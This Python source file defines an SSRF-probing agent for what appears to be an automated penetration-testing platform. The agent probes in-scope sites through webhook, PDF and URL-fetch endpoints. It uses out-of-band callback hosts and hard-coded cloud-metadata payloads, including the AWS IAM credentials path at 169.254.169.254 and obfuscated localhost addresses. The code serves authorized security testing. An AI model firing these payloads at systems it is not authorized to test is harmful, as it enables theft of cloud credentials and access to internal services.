"""SSRFAgent — probes PDF generators, webhooks, image processors via OAST."""
from __future__ import annotations

import asyncio
import json
import uuid
from pathlib import Path
from urllib.parse import urlparse

import httpx

from app.agents.base import BaseAgent
from app.agents.orchestrator import register_agent
from app.config import settings
from app.db.models import Asset, Finding, FindingStatus, Severity
from app.oast.interactsh import new_client

_PROMPT_PATH = Path(__file__).parent.parent / "prompts" / "ssrf.md"

_SSRF_PATHS = [
    # PDF / export
    "/export/pdf", "/api/pdf", "/print", "/render", "/screenshot",
    # Image / media
    "/api/image", "/upload/url", "/avatar/url", "/thumbnail",
    # Webhook
    "/webhooks", "/api/webhooks", "/settings/webhook", "/integrations",
    # URL fetch / preview
    "/api/fetch", "/proxy", "/link-preview", "/unfurl", "/fetch",
    # Import
    "/import", "/api/import/url", "/csv/import",
]

_SSRF_PARAMS = ["url", "src", "source", "target", "dest", "destination",
                 "redirect", "webhook", "endpoint", "uri", "path", "link"]

_CLOUD_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/computeMetadata/v1/instance/",
    "http://100.100.100.200/latest/meta-data/",
    "http://127.0.0.1/",
    "http://localhost:22/",
    "http://0.0.0.0/",
    "http://2130706433/",    # 127.0.0.1 decimal
    "http://0177.0.0.1/",   # 127.0.0.1 octal
]


@register_agent
class SsrfAgent(BaseAgent):
    name = "ssrf"

    async def _execute(self) -> dict:
        oast = new_client()
        oob_host = await oast.register()
        await self._emit("trace", {"message": f"OAST registered: {oob_host}"})

        scope_urls: list[str] = self.engagement.scope_urls
        confirmed: list[dict] = []
        tested = 0

        for base_url in scope_urls:
            parsed = urlparse(base_url if "://" in base_url else f"https://{base_url}")

            # Discover SSRF-prone endpoints
            endpoints = await self._find_ssrf_endpoints(base_url)
            await self._emit("trace", {"message": f"{parsed.hostname}: {len(endpoints)} potential SSRF endpoints"})

            for endpoint_url in endpoints:
                for param in _SSRF_PARAMS:
                    oob_url = f"http://{oast.unique_host()}"
                    result = await self._probe_ssrf(endpoint_url, param, oob_url)
                    tested += 1
                    if result.get("got_response"):
                        confirmed.append({**result, "oob_host": oob_url, "param": param})
                        await self._emit("trace", {"message": f"SSRF HIT: {endpoint_url} param={param}"})

        # Poll OAST for blind confirmations
        await self._emit("trace", {"message": "Polling OAST for blind interactions…"})
        interactions = await oast.poll(timeout_seconds=20)
        await oast.deregister()

        for interaction in interactions:
            await self._emit("trace", {"message": f"OAST interaction: {interaction.protocol} from {interaction.remote_address}"})
            confirmed.append({
                "type": "blind_ssrf_oast",
                "protocol": interaction.protocol,
                "remote": interaction.remote_address,
                "raw_request": interaction.raw_request[:500],
                "severity": "high",
            })

        # Also test with direct cloud metadata payloads
        for base_url in scope_urls:
            for path in _SSRF_PATHS[:5]:
                full_url = base_url.rstrip("/") + path
                for payload in _CLOUD_PAYLOADS[:3]:
                    for param in _SSRF_PARAMS[:3]:
                        result = await self._probe_ssrf(full_url, param, payload)
                        if result.get("cloud_metadata"):
                            confirmed.append({**result, "payload": payload, "endpoint": full_url, "param": param})
                            await self._emit("trace", {"message": f"CLOUD METADATA SSRF: {full_url}"})

        await self._persist(confirmed)
        await self._emit("trace", {"message": f"SSRF done: {tested} tested, {len(confirmed)} confirmed"})
        return {"tested": tested, "confirmed": len(confirmed), "interactions": len(interactions)}

    async def _find_ssrf_endpoints(self, base_url: str) -> list[str]:
        found: list[str] = []
        base = base_url.rstrip("/")
        async with httpx.AsyncClient(timeout=6, follow_redirects=False) as client:
            for path in _SSRF_PATHS:
                url = f"{base}{path}"
                try:
                    r = await client.get(url)
                    if r.status_code not in (404, 410, 301, 302):
                        found.append(url)
                except Exception:
                    pass
        return found

    async def _probe_ssrf(self, url: str, param: str, payload: str) -> dict:
        result: dict = {"url": url, "got_response": False, "cloud_metadata": False}
        async with httpx.AsyncClient(timeout=8, follow_redirects=True) as client:
            for method, kwargs in [
                ("GET", {"params": {param: payload}}),
                ("POST", {"data": {param: payload}}),
                ("POST", {"json": {param: payload}}),
            ]:
                try:
                    r = await client.request(method, url, **kwargs)
                    body = r.text[:1000]
                    if any(kw in body for kw in ["169.254", "instance-id", "ami-id", "iam/security", "computeMetadata"]):
                        result["got_response"] = True
                        result["cloud_metadata"] = True
                        result["response_excerpt"] = body
                        result["method"] = method
                        result["severity"] = "critical"
                        result["description"] = f"Full SSRF with cloud metadata access via {method} {url} param={param}"
                        break
                    if r.status_code in (200, 500) and payload in body:
                        result["got_response"] = True
                        result["response_excerpt"] = body
                        result["method"] = method
                        result["severity"] = "high"
                        result["description"] = f"SSRF: payload reflected in response via {method} {url} param={param}"
                        break
                except Exception:
                    pass
        return result

    async def _persist(self, findings: list[dict]) -> None:
        for item in findings:
            sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH}
            sev = sev_map.get(item.get("severity", "high"), Severity.HIGH)
            finding = Finding(
                id=str(uuid.uuid4()),
                engagement_id=self.engagement.id,
                title=f"SSRF — {item.get('url', item.get('type', 'unknown'))}",
                severity=sev,
                status=FindingStatus.PENDING,
                cvss_score=9.8 if sev == Severity.CRITICAL else 7.5,
                description=item.get("description", "Server-Side Request Forgery"),
                reproducer=f"{item.get('method', 'GET')} {item.get('url', '')} with {item.get('param', '')}={item.get('payload', '')}",
                impact=item.get("description", ""),
                meta=item,
            )
            self.db.add(finding)
        await self.db.commit()
